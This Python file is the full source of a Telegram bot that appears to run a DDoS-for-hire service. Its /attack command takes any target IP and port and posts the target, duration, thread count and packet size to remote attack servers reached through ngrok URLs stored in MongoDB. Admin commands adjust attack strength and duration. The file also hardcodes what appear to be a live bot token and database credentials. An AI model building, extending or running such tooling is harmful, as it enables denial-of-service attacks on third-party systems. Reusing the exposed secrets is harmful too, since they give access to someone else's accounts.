import os
import time
import asyncio
import aiohttp
import logging
from pymongo import MongoClient
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
)
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = '7379819567:AAHV83w8b8z5gNZDqdrFSG731Qyd-F3GtfA'  # Replace with your actual token

# MongoDB setup
MONGO_URI = "mongodb+srv://hmmSmokie:Saurabh0001@smokie.ibkld.mongodb.net/AttackDatabase?retryWrites=true&w=majority&appName=Smokie"
DB_NAME = "AttackDatabase"
COLLECTION_NAME = "ngrok_url"
SETTINGS_COLLECTION_NAME = "settings"  # Collection to store global settings

client = MongoClient(MONGO_URI)
db = client[DB_NAME]
collection = db[COLLECTION_NAME]
settings_collection = db[SETTINGS_COLLECTION_NAME]

# Admin user ID
PRIMARY_ADMIN_USER_ID = 1949883614  # Replace with the actual admin user ID
user_cooldowns = {}

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the @SmokieOfficial Public Bot 🔥*\n\n"
        "*Use /attack <ip> <port>*\n"
        "*Let the war begin with @Hmm_Smokie Bot⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is allowed to use the bot
    user_data = collection.find_one({"user_id": user_id})
    if not user_data:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 2:  # Changed to 2 args: IP and port
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port>*", parse_mode='Markdown')
        return

    ip, port = args

    # Fetch predefined duration from settings
    settings = settings_collection.find_one() or {}
    duration = settings.get("attack_duration", 240)  # Default to 240 seconds if not set

    try:
        port = int(port)
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Port must be a valid number!*", parse_mode='Markdown')
        return

    # Cooldown check
    current_time = time.time()
    last_attack_time = user_cooldowns.get(user_id, 0)
    if current_time - last_attack_time < 60:  # 1-minute cooldown
        remaining_time = 60 - int(current_time - last_attack_time)
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ You must wait {remaining_time} seconds before launching another attack!*",
            parse_mode='Markdown'
        )
        return

    # Update the cooldown for the user
    user_cooldowns[user_id] = current_time

    endpoint_url = user_data["ngrok_url"].strip() + "/run_Smokie"
    
    # Fetch current settings (threads and packet size) from the database
    threads = settings.get("threads", 2)  # Default to 2 if not set
    packet_size = settings.get("packet_size", 1)  # Default to 1 if not set
    
    payload = {
        "ip": ip,
        "port": port,
        "time": duration,
        "packet_size": packet_size,
        "threads": threads
    }

    # Send confirmation immediately that the attack has started
    await context.bot.send_message(chat_id=chat_id, text=f"*⚔️ Attack Launched on {ip}:{port} for {duration} seconds!*\n*🔥 Let the battlefield ignite! 💥*", parse_mode='Markdown')

    # Run the attack asynchronously in the background to not block other users
    asyncio.create_task(run_attack(endpoint_url, payload, chat_id, context))

async def set_duration(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Only the admin can set duration
    if user_id != PRIMARY_ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /duration <seconds>*", parse_mode='Markdown')
        return

    try:
        attack_duration = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"attack_duration": attack_duration}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Attack duration set to {attack_duration} seconds!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for duration!*", parse_mode='Markdown')
        

async def run_attack(endpoint_url, payload, chat_id, context):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(endpoint_url, json=payload) as response:
                if response.status == 200:
                    await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed!*", parse_mode='Markdown')
                else:
                    await context.bot.send_message(chat_id=chat_id, text="*❌ Attack Failed!*", parse_mode='Markdown')
        except Exception as e:
            await context.bot.send_message(chat_id=chat_id, text=f"*❌ Error: {str(e)}*", parse_mode='Markdown')

# Admin-only settings modification
async def set_thread(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Only the admin can set threads
    if user_id != PRIMARY_ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /thread <number>*", parse_mode='Markdown')
        return

    try:
        threads = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"threads": threads}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Thread count set to {threads}!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for threads!*", parse_mode='Markdown')

async def set_byte(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Only the admin can set byte size
    if user_id != PRIMARY_ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /byte <number>*", parse_mode='Markdown')
        return

    try:
        packet_size = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"packet_size": packet_size}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Packet size set to {packet_size} bytes!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for packet size!*", parse_mode='Markdown')

async def show_settings(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != PRIMARY_ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return
    
    # Retrieve the current settings from MongoDB
    settings = settings_collection.find_one()  # Get the first (and only) document in the settings collection
    
    if not settings:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Settings not found!*", parse_mode='Markdown')
        return
    
    threads = settings.get("threads", "Not set")
    packet_size = settings.get("packet_size", "Not set")
    
    # Send the settings to the user
    message = (
        f"*⚙️ Current Settings:*\n"
        f"*Threads:* {threads}\n"
        f"*Packet Size:* {packet_size} bytes"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("duration", set_duration))  # New command to set attack duration6

    application.run_polling()

if __name__ == '__main__':
    print("Bot Is Running Bhai....")
    main()
